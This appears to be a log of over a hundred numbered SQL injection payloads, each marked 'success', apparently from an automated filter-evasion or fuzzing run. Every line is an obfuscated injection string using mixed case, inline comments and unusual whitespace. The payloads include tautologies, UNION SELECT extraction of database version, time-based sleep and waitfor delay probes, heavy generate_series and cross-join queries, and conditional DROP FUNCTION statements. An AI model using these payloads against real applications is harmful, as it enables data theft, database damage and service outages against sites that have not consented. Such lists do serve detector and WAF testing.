15 success "1%' And/**/2006  =  0x7d6 "
16 success '-9031%"  )   order/**/by 1-- '
29 success 'EnD ANd    (    (  /**/3392 LIKE 3392 OR 0\x0b'
36 success '1" where 3901\tNOT LIKE/**/3902 '
69 success '1  )   AnD elt  (  0x1d01  =  8842,8842  )   AND   (  9995 NOT LIKE 9996 aNd 1 '
71 success ' select * frOm users WHERE id   LIke   1 Or 1#"? union SeLECT null,version  (    )   -- 1 '
80 success '0x1\x0border/**/by 0x1-- '
85 success ' SElecT * fRoM users whEre id  =  0x1 OR 1#"1 union sELecT\t\'a\',version  (    ) \xa0 -- 1 '
88 success "1' wHeRe 0x21bb  =  (SeLECt/**/8635) OrDer/**/bY 1-- "
102 success "1' where 570=570 "
103 success '1" where 280=280 '
114 success "1' where ']'\tNOT LIKE ']P' "
118 success "sELEcT count  (  *  )   from sysibm.systables AS t1,sysibm.systables as t2,sysibm.systables aS t3 And    (    (     (  'vcgc' lIKe 'vcgc "
122 success "1'  ) \x0b whEre '~' NOT LIKE '~[' "
139 success '1"  )\xa0  as/**/rcnk wherE 6560 not like (SELECT 6561) '
141 success '0x1%"  )   AnD (sELeCT 0x1f58)  =  0xde8-- Qx'
145 success "SelecT count\n (  *  )   FroM generate_series  (  1,5000000  )   aND    (    (   '.T'='.T' "
152 success '1"  )   wHErE 9962\n =  9962 aND \'IT%/\' NOT LIKE \'IT%/V\'# '
154 success '1" wheRE 0x1ec7   lIke  /*|*/7879 '
158 success "0x1'   )    )    as xkiq where 9342 NOT LIKE 9343 and sleep  (  5  )  -- "
165 success "0x1'  )   where 3476  =  0xd94 AND 1 AND elt  (  9955=9955,sleep  (  5   )    ) \n -- "
166 success "1'||  (  select 'ymre' wHEre/**/1968 NOT LIKE (SeLeCt 1969) "
181 success "1  )   oR elt  (  0x1880 \x0b=  0x1880,sleep  (  5   )    )    ANd   (  '_n' NOT LIKE '_nl' "
202 success '-5591%" \x0c )    )    order/**/by 1-- '
204 success "-0x20da'   )    )     )   or '*;'='*;'-- "
208 success "0x1' In boolean/**/mode  )    AnD  sleep  (  0x5  )  # "
228 success "1' wheRE/**/6684\x0biN (6683,0x1a1c,6685)\n"
232 success "0x1'\t )   union/**/all sELEcT null,null,null,null,null,null-- "
241 success "1'||  (  select 'vdeo' where 0x1103   like   0x1103 "
245 success "1'  )   aND 0x20d7   LIKE     (  seLECT count  (  *  )   FROM generate_series  (  0x1,5000000   )    )    "
246 success "selEct sleep  (  5  )    AND     (    (   '/-v' NOT LIKE '/-v6' "
255 success ' SeLecT * fROM users WHErE id \xa0 liKe   \'1\' union selEct $["],@@VERSION -- 0x1\' '
262 success "-5356'  )   OR 0x246b  = /**/9323# +E"
288 success '1%" and 2644=2644 and "%"  =  " '
306 success '1"  )   where \':5j\' LIKE \':5j\' '
322 success 'iF  (  3392  =  4422  )   seLeCT 3392 eLSE DrOp function xsqq-- '
332 success "-9393' where 3119  = \t0xc2f OR 'q' LIKE 'q'-- "
342 success "1'  )   wHEre 6731   LIKE \n 6731 or elt  (  'x-' LIKE 'x-',sleep  (  5   )    )   # "
352 success '%27/**/OR 1\xa0 =  1 OR False '
356 success "-9509'   )    )     )   or 1091  =  0x1565 and    (    (     (  'gsmz'  =  'gsmz "
360 success "0x1' in/**/boolean mode  )\t  and 0x23ee\xa0  LIKE   0x23ee-- "
373 success '1  )   or elt  (  0x16f1   LIKE   0x16f1,sleep  (  5   )    )   # '
381 success '1"   )    )    and 0x1de8  =  5604 and    (    (   "zuhv"  =  "zuhv '
388 success '-4494 oR 5291  =  4452/**/'
391 success "1'||\t ( \xa0select 'lljg' fRoM dual wHErE 9525=9525 or False oR 0 "
433 success '-2448%"  )   || 0xbde  =  0xbde '
438 success "1'  )   as chla where '~G]' NOT LIKE '~G]Z' "
444 success "1'  )   And 7533/**/ = \n0x1d6d "
450 success 'select sleep  (  0x5  )   ANd    (    (     (  "%"  =  " '
452 success ' SELecT/**/sleep  (  5  )   and "%"  =  " '
457 success '(seLECt (SELECT 1))"  )   As ebvt WHeRe 0x1c4e NOT LIKE 7247 '
459 success '-0x268f"  )  \x0bunion all select 0x237a# '
463 success '0x1"   )    )    AS nncz wHerE 0x91b  =  0x91b '
487 success "0x1%'  )   AND elt  (  0xc2a   LIKE   0xc2a,sleep  (  5   )    )\n  # WE"
513 success '-2211" oR 0x841/**/  like   (SELECT 0x22b5)# '
516 success "waitfor/**/delay '0x0:0:5' ANd '%'  =\t ' "
524 success '-0x2035"   )    )    || 0xbde  =  0xbde '
541 success "1  )   where\x0c'&' NOT LIKE '&H' "
558 success "0x1'  )   order/**/by 1# \n\r"
561 success ' SELecT * FROm users WHeRE id  =  1 OR  @$#  =  1 union select 1,version  (    )   -- 1 _&'
574 success "-4775'  )   or '+' NOT LIKE '+u' "
575 success 'IF  (  4735   lIKE   8907  )   SeLEcT 4735 elsE Drop function qigo--\x0b'
594 success "-6567'   )    )    union all sEleCt/**/3217# /7"
649 success '-0x1edd  )  /**/order\x0cby 0x1-- '
654 success '1" where \'BV\' NOT LIKE \'BVv\'\n'
658 success "1' where\t'p'='p' union all select null,null,null-- "
665 success '0x1  )\x0b  as\todqn Where 0xf46\x0c =  0xf46 '
668 success '-0xa62  )   AS casi WHEre 3557 LIKE (SELECT 3557) oR 8245/**/ =  9651-- &'
681 success "(SELEct 1)'\t  )    )    and 9918 LIKE 9918 OR '%ld'='%ldj' and    (  \x0b (   'ialm'  =  'ialm "
683 success "1'  )  /**/as mqxb where 4916 NOT LIKE 4917 AND True && 0x1d6d \t LIKE   0x1d6d-- "
693 success "waitfor/**/delay '0:0x0:5' and 'gsvt'  =  'gsvt "
698 success '1"   )    )    aS eglv\x0bWhErE \'kDlK\' LIKE \'kDlK\' union all sElecT/**/null# S'
699 success '0x1   )    )    as wwkw WheRE 7289   liKe   7289 aNd 788 NOT LIKE 789 AND True-- '
701 success '-9841 wHEre 0x1690 lIKE 5776/**/union all\xa0sELeCt/**/4612-- '
706 success "0x1'  )   as ohcs wheRe/**/'t'='t' oR elt  (  (sELECt 0x1880)   lIke   0x1880,sleep  (  0x5   )    )   -- "
722 success "1'+  (  SeLECt nash WhErE 348 IN (347,348,349) union all SelECt null#\x0c"
726 success "1' wHeRE/**/9416   LiKe   0x24c8 "
738 success '(SELECT 0x1c)%\t'
752 success " SEleCt * FroM users WheRe\x0bid   LikE   '0x1' Or \\<$ union SelEcT 1,@@VERSION -- 1' \t"
759 success "(SELECT 1)'||  (  select 'zyvk' FrOM dual wheRe\t'K^' NOT LIKE 'K^Q' "
764 success '1  )   as ghew where 0x2015 NOT LIKE 0x2016 union all select null,null-- '
765 success "1'  )   wHere/**/0x2063   LIKe   0x2063 "
768 success "1'   )    )    or elt  (  0x1880  =  0x1880,sleep  (  5   )    )    and    (    (   'cwjd'  =  'cwjd "
777 success "0x1  )   Where 'q' NOT LIKE 'qP' "
782 success "waitfor/**/delay '0:0:5'/**/and   (  'M?'='M?' "
802 success '1 wHERe 2301/**/ =  0x8fd anD True/**/Or False '
808 success '1  )   && make_set  (  1567 NOT LIKE 1568,0x22c3  )   '
818 success '0x1 aNd elt\n (\xa0 0x4ba  =  0x4ba,sleep  (  0x5   )    )   # macc ,@'
823 success ' SEleCt * FRom users WhEre id  =  1 Or @#",  =  0x1 union seLEcT 1,version  (    )   -- 1 On'
847 success '0x1" \x0c )    )     )    OR  0x1cf9   LIKE     (  SeLECT count  (  *  )\xa0  FrOm sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables aS t3  )  -- '
849 success "1%'   )    )     )   and   (  9404  =  0x20c6  )  *0x20c6 and    (    (     (  '%'  =  ' "
853 success ' (  CASE wheN 8422  =  0x2104 Then\t1 elSe null eND  )  '
889 success "1   )    )    as gxvp where 'M' NOT LIKE 'Mv' "
900 success '-(SElECT 9265)"  )\x0b  Or 0x1e9a  = /**/1685 '
901 success "1'+  (  select 'xqjx' WhEre 7048  =  7048 AND 0x23ee  =  9198-- "
914 success 'SELecT CASe When 0x1dd2   liKE   3954 then 1 else\x0cnull ENd-- '
932 success "1 WhERE '\n' NOT LIKE '\n<' OR False "
942 success "seleCt count  (  *  )   fRom generate_series  (  0x1,5000000  )   AND 'roca'  =  'roca\t"
953 success "waitfor\tdelay/**/'0x0:0:5'\n"
992 success "-0xb35'   )\x0b   )    union/**/all sElect/**/0xc90-- "
995 success "1'  )   wHERE\n0x45b   LIKE   0x45b ANd 1 "
1000 success '1\x0bwhere 4628 NOT LIKE 4629 '
1002 success "-3107'  )   wHEre\n7782  =  7782 Or/**/8571   LIKE   8571-- "
1012 success 'If  (  8995   LiKe   9787  )   sELECT/**/8995 eLsE DRoP function ofgg-- A '
1017 success '-9037%" union all SeLEct 0x19b7# '
1018 success "-1641'\xa0union\tall select 0x12e3# +^"
1022 success 'elt \n(  2567/**/ =  0x26c1,9921  )   '
1031 success "sELEcT pg_sleep  (  5  )   AnD '%'   Like   ' "
1047 success "1  )   whERe 1729\x0bliKE 1729 AND 'v'='v' "
1050 success '-0x4b3"   )    )  \x0b Or 0x217b  =  8571--\n'
1051 success '-9535"/**/order by/**/1-- '
1066 success "1'   )    )    union/**/all select null,null,null,null,null-- W+"
1069 success '-0x141b oR   (  0x210b  \x0bliKE   0x210b  )  *0x132a '
1074 success "1'  )   aS bzem WheRE 4240  =  0x1090 "
1102 success '1" and elt  (  0x1ee6 NOT LIKE 7911,sleep  (  5   )    )    '
1104 success "-6218'   )    )    oR 0x8bc   LiKe   4469# "
1109 success '1"   )    )    or (SElEcT 0x1090)  =    (  selEcT 0x1090 FroM pg_sleep  (  0x5   )    )   -- '
1117 success '-5963" oR 0x246b   LIKE \t 0x246b# j,'
1122 success "select count  (  *  )   from generate_series  (  1,0x4c4b40  )   and    (    (   'hxcq'  =  'hxcq "
1123 success "-1602' Or 'M'='M' and True\n"
1124 success 'SELECT cASe whEn 0xb72   lIKe  /**/7964 THen\x0b1 ElSe null ENd-- '
1129 success "-9657'  )   AS ziiq WHere 0x1e2d  =  0x1e2d or '7Ly' NOT LIKE '7Ly%' OR '\t.G' NOT LIKE '\t.G'/**/Or False "
1133 success '1"  )   WHERE 3175 LIkE 3175 ANd \'D\' NOT LIKE \'D_\' '
1139 success "1' where 7289 LIKE 7289 union all select null,null-- "
1144 success ' SeLEct * FRoM users Where id  =  1 or "?  (  " OR 9724 LikE 9724 -- 1 '
